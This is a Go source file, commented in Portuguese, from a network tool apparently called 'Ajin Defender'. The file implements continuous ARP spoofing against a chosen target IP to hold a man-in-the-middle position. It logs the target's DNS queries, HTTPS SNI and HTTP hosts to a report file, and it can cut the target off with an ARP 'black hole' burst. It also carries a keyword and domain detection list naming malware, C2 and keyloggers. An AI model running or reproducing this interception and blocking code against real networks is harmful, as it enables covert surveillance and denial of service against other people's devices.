package sniffer

import (
	"context"
	"fmt"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/gabrifranca/cli_ping/internal/report"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	manuf "github.com/timest/gomanuf"
)

// MonitorLog armazena todos os eventos capturados durante o monitoramento de um IP alvo.
type MonitorLog struct {
	TargetIP      string
	StartTime     time.Time
	Events        []MonitorEvent
	TotalPackets  int
	TotalBytes    int
	DNSQueries    map[string]int // Domínio -> Contagem
	SNIAccesses   map[string]int // Domínio HTTPS -> Contagem
	HTTPAccesses  map[string]int // Domínio HTTP -> Contagem
	TCPFlags      map[string]int
	SuspiciousSYN int
	BlockedAt     *time.Time // Se o WiFi foi bloqueado, registra quando
	BlockReason   string     // Razão do bloqueio
}

// MonitorEvent representa um evento único de rede capturado.
type MonitorEvent struct {
	Timestamp   time.Time
	Type        string // "DNS", "HTTPS", "HTTP", "TCP", "ALERT"
	Source      string
	Destination string
	Detail      string
}

// NewMonitorLog cria uma nova instância de MonitorLog.
func NewMonitorLog(targetIP string) *MonitorLog {
	return &MonitorLog{
		TargetIP:     targetIP,
		StartTime:    time.Now(),
		Events:       make([]MonitorEvent, 0),
		DNSQueries:   make(map[string]int),
		SNIAccesses:  make(map[string]int),
		HTTPAccesses: make(map[string]int),
		TCPFlags:     make(map[string]int),
	}
}

// MonitorTarget inicia o monitoramento contínuo de um IP alvo já anexado via ARP Spoof.
// O canal 'blockCh' permite que o controlador externo solicite o bloqueio do WiFi do alvo.
// O canal 'alertCh' notifica o controlador sobre atividades suspeitas detectadas.
func (s *SnifferService) MonitorTarget(
	ctx context.Context,
	targetIP string,
	deviceName string,
	myMAC, targetMAC, gatewayMAC net.HardwareAddr,
	gatewayIP net.IP,
	blockCh <-chan bool,
	alertCh chan<- string,
) (*MonitorLog, error) {

	// Auto-resolve parâmetros de rede quando não fornecidos
	if deviceName == "" || myMAC == nil || targetMAC == nil || gatewayMAC == nil || gatewayIP == nil {
		resolvedDevName, resolvedDevIP := s.findActiveInterface()
		if resolvedDevName == "" {
			return nil, fmt.Errorf("erro: não foi possível encontrar interface de rede ativa")
		}
		if deviceName == "" {
			deviceName = resolvedDevName
		}

		resolvedMAC, cidr := s.getInterfaceDetails(resolvedDevIP)
		if myMAC == nil {
			myMAC = resolvedMAC
		}

		if gatewayIP == nil && cidr != "" {
			gatewayIP = gatewayIPFromCIDROrOS(cidr)
		}

		if gatewayMAC == nil && gatewayIP != nil && myMAC != nil {
			gatewayMAC = s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(resolvedDevIP), gatewayIP)
		}

		if targetMAC == nil && myMAC != nil {
			targetMAC = s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(resolvedDevIP), net.ParseIP(targetIP))
			if targetMAC == nil {
				known := loadKnownDevices()
				for macStr, dev := range known {
					if dev.LastIP == targetIP {
						targetMAC, _ = net.ParseMAC(macStr)
						break
					}
				}
			}
		}

		if myMAC == nil || targetMAC == nil || gatewayMAC == nil || gatewayIP == nil {
			return nil, fmt.Errorf("erro: não foi possível resolver parâmetros de rede (myMAC=%v, targetMAC=%v, gwMAC=%v, gwIP=%v)", myMAC, targetMAC, gatewayMAC, gatewayIP)
		}

		fmt.Printf("  [*] Parâmetros de rede auto-resolvidos:\n")
		fmt.Printf("      Interface: %s\n", deviceName)
		fmt.Printf("      Nosso MAC: %s\n", myMAC.String())
		fmt.Printf("      Alvo MAC:  %s\n", targetMAC.String())
		fmt.Printf("      Gateway:   %s (MAC: %s)\n", gatewayIP.String(), gatewayMAC.String())
	}

	// Abre handle para envenenamento ARP contínuo
	poisonHandle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("erro ao abrir handle de envenenamento: %v", err)
	}
	defer poisonHandle.Close()

	// Abre handle para captura de tráfego
	captureHandle, err := pcap.OpenLive(deviceName, 65535, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("erro ao abrir handle de captura: %v", err)
	}
	defer captureHandle.Close()

	monLog := NewMonitorLog(targetIP)
	var mu sync.Mutex

	// Estado de bloqueio
	blocked := false

	// Domínios suspeitos conhecidos (C2, malware, phishing)
	suspiciousDomains := map[string]string{
		"evil.com":            "Domínio de teste malicioso",
		"malware-c2.net":     "Possível servidor C2",
		"phishing-site.com":  "Possível phishing",
		"cryptominer.xyz":    "Possível mineração cripto",
		"darkweb-proxy.onion.ws": "Acesso a proxy da Dark Web",
	}

	// Palavras-chave suspeitas em domínios DNS
	suspiciousKeywords := []string{
		"malware", "exploit", "payload", "backdoor", "trojan",
		"keylogger", "ransomware", "botnet", "c2server", "phish",
		"darkweb", "torrent-proxy", "crack", "hack-tool",
	}

	// Goroutine 1: Envenenamento ARP contínuo (mantém o MitM ou Black Hole ativo)
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				mu.Lock()
				isBlocked := blocked
				mu.Unlock()
				if isBlocked {
					// MODO BLOQUEIO TOTAL: envia ARPs apontando gateway para MAC inexistente (Black Hole)
					// O alvo envia frames para de:ad:be:ef:00:01, que não existe → switch descarta tudo
					_ = s.SendARPBlackhole(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayIP)
				} else {
					// MODO MitM NORMAL: aponta gateway para nosso MAC (interceptação com forwarding)
					_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
					_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
				}
				time.Sleep(500 * time.Millisecond) // Intervalo mais agressivo para vencer ARPs legítimos
			}
		}
	}()

	// Goroutine 2: Escuta o canal de bloqueio/desbloqueio
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case shouldBlock := <-blockCh:
				mu.Lock()
				if shouldBlock && !blocked {
					blocked = true
					now := time.Now()
					monLog.BlockedAt = &now
					if monLog.BlockReason == "" {
						monLog.BlockReason = "Bloqueio manual pelo operador"
					}

					// DESATIVA IP Forwarding (camada extra de segurança)
					_ = disableIPForwardingErr()

					// Envia rajada de ARPs Black Hole para envenenar o cache imediatamente
					for i := 0; i < 10; i++ {
						_ = s.SendARPBlackhole(poisonHandle, targetMAC, net.ParseIP(targetIP), gatewayIP)
						time.Sleep(50 * time.Millisecond)
					}

					fmt.Printf("\n  %s[🛑 BLOQUEIO TOTAL ATIVO]%s WiFi do alvo %s foi NEGADO.%s\n", "\033[31m", "\033[0m", targetIP, "\033[0m")
					fmt.Printf("  %s    → Técnica: ARP Black Hole (MAC inexistente de:ad:be:ef:00:01)%s\n", "\033[33m", "\033[0m")
					fmt.Printf("  %s    → Tráfego do alvo é descartado pelo switch. Bloqueio 100%% efetivo.%s\n", "\033[33m", "\033[0m")

					monLog.Events = append(monLog.Events, MonitorEvent{
						Timestamp: time.Now(),
						Type:      "BLOCK",
						Source:    "OPERADOR",
						Detail:    "WiFi NEGADO - ARP Black Hole ativo (MAC de:ad:be:ef:00:01)",
					})

					if alertCh != nil {
						alertCh <- fmt.Sprintf("[BLOCK] WiFi negado para %s (Black Hole)", targetIP)
					}

				} else if !shouldBlock && blocked {
					blocked = false

					// REATIVA IP Forwarding
					_ = enableIPForwarding()

					// Envia rajada de ARPs restaurando nosso MAC para retomar o MitM
					for i := 0; i < 10; i++ {
						s.SendARPRestore(poisonHandle, myMAC, targetMAC, net.ParseIP(targetIP), gatewayIP)
						_ = s.sendARPReply(poisonHandle, myMAC, net.ParseIP(targetIP), gatewayMAC, gatewayIP)
						time.Sleep(50 * time.Millisecond)
					}

					fmt.Printf("\n  %s[✓ DESBLOQUEIO]%s WiFi do alvo %s foi RESTAURADO.%s\n", "\033[32m", "\033[0m", targetIP, "\033[0m")

					monLog.Events = append(monLog.Events, MonitorEvent{
						Timestamp: time.Now(),
						Type:      "UNBLOCK",
						Source:    "OPERADOR",
						Detail:    "WiFi RESTAURADO - MitM reativado com nosso MAC",
					})
				}
				mu.Unlock()
			}
		}
	}()

	// Goroutine 3: Captura e análise de tráfego em tempo real
	go func() {
		synCounter := make(map[string]int)     // IP -> contagem de SYN (janela temporal)
		synWindow := make(map[string]time.Time) // IP -> início da janela

		for {
			select {
			case <-ctx.Done():
				return
			default:
				data, _, err := captureHandle.ReadPacketData()
				if err != nil {
					continue
				}

				packet := gopacket.NewPacket(data, captureHandle.LinkType(), gopacket.Default)

				// Filtra: apenas tráfego do ou para o alvo
				netLayer := packet.NetworkLayer()
				if netLayer == nil {
					continue
				}
				srcIP := netLayer.NetworkFlow().Src().String()
				dstIP := netLayer.NetworkFlow().Dst().String()

				if srcIP != targetIP && dstIP != targetIP {
					continue
				}

				mu.Lock()
				monLog.TotalPackets++
				monLog.TotalBytes += len(data)

				// === Análise de Segurança ===

				// 1. Análise TCP (detecção de SYN Scan / Port Scan)
				if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
					tcp, _ := tcpLayer.(*layers.TCP)
					dstPort := tcp.DstPort.String()

					// Flags TCP
					if tcp.SYN {
						monLog.TCPFlags["SYN"]++
					}
					if tcp.ACK {
						monLog.TCPFlags["ACK"]++
					}
					if tcp.RST {
						monLog.TCPFlags["RST"]++
					}
					if tcp.FIN {
						monLog.TCPFlags["FIN"]++
					}

					// Detecção de SYN Scan: muitos SYN sem ACK em curto período
					if tcp.SYN && !tcp.ACK && srcIP == targetIP {
						now := time.Now()
						if windowStart, exists := synWindow[srcIP]; !exists || now.Sub(windowStart) > 10*time.Second {
							synCounter[srcIP] = 0
							synWindow[srcIP] = now
						}
						synCounter[srcIP]++

						if synCounter[srcIP] > 20 {
							monLog.SuspiciousSYN++
							alert := fmt.Sprintf("[ALERTA] %s executando possível SYN Scan! (%d SYNs em 10s)", srcIP, synCounter[srcIP])

							monLog.Events = append(monLog.Events, MonitorEvent{
								Timestamp: time.Now(),
								Type:      "ALERT",
								Source:    srcIP,
								Detail:    alert,
							})

							fmt.Printf("  %s⚠ %s%s\n", "\033[31m", alert, "\033[0m")

							if alertCh != nil {
								alertCh <- alert
							}

							synCounter[srcIP] = 0
							synWindow[srcIP] = now
						}
					}

					// Captura SNI (HTTPS)
					if srcIP == targetIP && dstPort == "443" && len(tcp.Payload) > 0 {
						sni := parseTLSSNI(tcp.Payload)
						if sni != "" {
							monLog.SNIAccesses[sni]++

							event := MonitorEvent{
								Timestamp:   time.Now(),
								Type:        "HTTPS",
								Source:      srcIP,
								Destination: sni,
								Detail:      fmt.Sprintf("HTTPS → %s", sni),
							}
							monLog.Events = append(monLog.Events, event)

							// Log em tempo real
							statusIcon := "🔒"
							alertMsg := ""

							// Verifica se é um domínio suspeito
							sniLower := strings.ToLower(sni)
							if reason, sus := suspiciousDomains[sniLower]; sus {
								statusIcon = "🚨"
								alertMsg = fmt.Sprintf(" [SUSPEITO: %s]", reason)

								if alertCh != nil {
									alertCh <- fmt.Sprintf("[THREAT] %s acessou domínio suspeito: %s (%s)", srcIP, sni, reason)
								}
							}

							// Verifica keywords suspeitas
							for _, kw := range suspiciousKeywords {
								if strings.Contains(sniLower, kw) {
									statusIcon = "🚨"
									alertMsg = fmt.Sprintf(" [KEYWORD SUSPEITA: %s]", kw)

									if alertCh != nil {
										alertCh <- fmt.Sprintf("[THREAT] %s acessou domínio com keyword suspeita '%s': %s", srcIP, kw, sni)
									}
									break
								}
							}

							fmt.Printf("  [%s] %s %s → %s%s%s\n",
								time.Now().Format("15:04:05"),
								statusIcon, srcIP, sni, alertMsg, "\033[0m")
						}
					}

					// Captura HTTP Host
					if srcIP == targetIP && dstPort == "80" && len(tcp.Payload) > 0 {
						host := parseHTTPHost(tcp.Payload)
						if host != "" {
							monLog.HTTPAccesses[host]++

							event := MonitorEvent{
								Timestamp:   time.Now(),
								Type:        "HTTP",
								Source:      srcIP,
								Destination: host,
								Detail:      fmt.Sprintf("HTTP → %s", host),
							}
							monLog.Events = append(monLog.Events, event)

							fmt.Printf("  [%s] %s %s → %s%s\n",
								time.Now().Format("15:04:05"),
								"🌐", srcIP, host, "\033[0m")
						}
					}
				}

				// 2. Análise DNS
				if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
					dns, _ := dnsLayer.(*layers.DNS)
					if dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && srcIP == targetIP {
						dnsQuery := string(dns.Questions[0].Name)
						monLog.DNSQueries[dnsQuery]++

						event := MonitorEvent{
							Timestamp:   time.Now(),
							Type:        "DNS",
							Source:      srcIP,
							Destination: dnsQuery,
							Detail:      fmt.Sprintf("DNS Query → %s", dnsQuery),
						}
						monLog.Events = append(monLog.Events, event)

						// Verifica ameaça DNS
						dnsLower := strings.ToLower(dnsQuery)
						alertMsg := ""
						if reason, sus := suspiciousDomains[dnsLower]; sus {
							alertMsg = fmt.Sprintf(" %s[🚨 AMEAÇA: %s]%s", "\033[31m", reason, "\033[0m")

							if alertCh != nil {
								alertCh <- fmt.Sprintf("[THREAT-DNS] %s consultou domínio malicioso: %s (%s)", srcIP, dnsQuery, reason)
							}
						}

						for _, kw := range suspiciousKeywords {
							if strings.Contains(dnsLower, kw) {
								alertMsg = fmt.Sprintf(" %s[🚨 KEYWORD: %s]%s", "\033[31m", kw, "\033[0m")
								if alertCh != nil {
									alertCh <- fmt.Sprintf("[THREAT-DNS] %s consultou domínio suspeito '%s': %s", srcIP, kw, dnsQuery)
								}
								break
							}
						}

						fmt.Printf("  [%s] %s %s → DNS: %s%s\n",
							time.Now().Format("15:04:05"),
							"🔍", srcIP, dnsQuery, alertMsg)
					}
				}

				mu.Unlock()
			}
		}
	}()

	// Bloqueia até o contexto ser cancelado
	<-ctx.Done()

	mu.Lock()
	defer mu.Unlock()

	// Gera o relatório log_ip.txt
	s.generateIPLog(monLog, targetMAC)

	return monLog, nil
}

// generateIPLog gera o arquivo log_ip.txt com todo o histórico de monitoramento.
func (s *SnifferService) generateIPLog(monLog *MonitorLog, targetMAC net.HardwareAddr) {
	var sb strings.Builder

	sb.WriteString("=========================================================================\n")
	sb.WriteString("          RELATÓRIO DE MONITORAMENTO DE REDE - AJIN DEFENDER             \n")
	sb.WriteString("=========================================================================\n")
	sb.WriteString(fmt.Sprintf("  IP Monitorado:     %s\n", monLog.TargetIP))
	if targetMAC != nil {
		vendor := manuf.Search(targetMAC.String())
		if vendor == "" {
			vendor = "Desconhecido"
		}
		sb.WriteString(fmt.Sprintf("  MAC Monitorado:    %s (%s)\n", targetMAC.String(), vendor))
	}
	sb.WriteString(fmt.Sprintf("  Início:            %s\n", monLog.StartTime.Format("02/01/2006 15:04:05")))
	sb.WriteString(fmt.Sprintf("  Fim:               %s\n", time.Now().Format("02/01/2006 15:04:05")))
	sb.WriteString(fmt.Sprintf("  Duração:           %s\n", time.Since(monLog.StartTime).Round(time.Second)))
	sb.WriteString(fmt.Sprintf("  Total de Pacotes:  %d\n", monLog.TotalPackets))
	sb.WriteString(fmt.Sprintf("  Volume Total:      %.2f KB\n", float64(monLog.TotalBytes)/1024.0))

	// Status de bloqueio
	if monLog.BlockedAt != nil {
		sb.WriteString(fmt.Sprintf("\n  [!] WiFi BLOQUEADO em: %s\n", monLog.BlockedAt.Format("02/01/2006 15:04:05")))
		sb.WriteString(fmt.Sprintf("      Razão: %s\n", monLog.BlockReason))
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  CONSULTAS DNS\n")
	sb.WriteString("=========================================================================\n")
	if len(monLog.DNSQueries) > 0 {
		type dnsEntry struct {
			domain string
			count  int
		}
		var sorted []dnsEntry
		for d, c := range monLog.DNSQueries {
			sorted = append(sorted, dnsEntry{d, c})
		}
		sort.Slice(sorted, func(i, j int) bool {
			return sorted[i].count > sorted[j].count
		})
		for _, e := range sorted {
			sb.WriteString(fmt.Sprintf("  %-55s (%d consultas)\n", e.domain, e.count))
		}
	} else {
		sb.WriteString("  Nenhuma consulta DNS interceptada.\n")
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  ACESSOS HTTPS (SNI)\n")
	sb.WriteString("=========================================================================\n")
	if len(monLog.SNIAccesses) > 0 {
		type sniEntry struct {
			domain string
			count  int
		}
		var sorted []sniEntry
		for d, c := range monLog.SNIAccesses {
			sorted = append(sorted, sniEntry{d, c})
		}
		sort.Slice(sorted, func(i, j int) bool {
			return sorted[i].count > sorted[j].count
		})
		for _, e := range sorted {
			sb.WriteString(fmt.Sprintf("  🔒 %-53s (%d acessos)\n", e.domain, e.count))
		}
	} else {
		sb.WriteString("  Nenhum acesso HTTPS capturado.\n")
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  ACESSOS HTTP\n")
	sb.WriteString("=========================================================================\n")
	if len(monLog.HTTPAccesses) > 0 {
		type httpEntry struct {
			domain string
			count  int
		}
		var sorted []httpEntry
		for d, c := range monLog.HTTPAccesses {
			sorted = append(sorted, httpEntry{d, c})
		}
		sort.Slice(sorted, func(i, j int) bool {
			return sorted[i].count > sorted[j].count
		})
		for _, e := range sorted {
			sb.WriteString(fmt.Sprintf("  🌐 %-53s (%d acessos)\n", e.domain, e.count))
		}
	} else {
		sb.WriteString("  Nenhum acesso HTTP capturado.\n")
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  ESTATÍSTICAS TCP\n")
	sb.WriteString("=========================================================================\n")
	for flag, count := range monLog.TCPFlags {
		sb.WriteString(fmt.Sprintf("  %-10s: %d ocorrências\n", flag, count))
	}
	if monLog.SuspiciousSYN > 0 {
		sb.WriteString(fmt.Sprintf("\n  [!] ALERTAS DE SYN SCAN: %d detecções\n", monLog.SuspiciousSYN))
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  LOG DE EVENTOS (CRONOLÓGICO)\n")
	sb.WriteString("=========================================================================\n")
	if len(monLog.Events) > 0 {
		for _, event := range monLog.Events {
			prefix := "  "
			switch event.Type {
			case "ALERT":
				prefix = "  [!] "
			case "BLOCK":
				prefix = "  [🛑] "
			case "UNBLOCK":
				prefix = "  [✓] "
			}
			sb.WriteString(fmt.Sprintf("%s[%s] [%s] %s → %s | %s\n",
				prefix,
				event.Timestamp.Format("15:04:05"),
				event.Type,
				event.Source,
				event.Destination,
				event.Detail,
			))
		}
	} else {
		sb.WriteString("  Nenhum evento registrado.\n")
	}

	sb.WriteString("\n=========================================================================\n")
	sb.WriteString("  FIM DO RELATÓRIO\n")
	sb.WriteString("=========================================================================\n")

	// Salva no arquivo log_ip.txt
	reporter := report.NewFileWriter()
	_ = reporter.SaveReport("log_ip.txt", sb.String())

	// Imprime no console
	fmt.Print(sb.String())
}

// disableIPForwardingErr desativa IP Forwarding e retorna erro, se houver.
func disableIPForwardingErr() error {
	disableIPForwarding()
	return nil
}
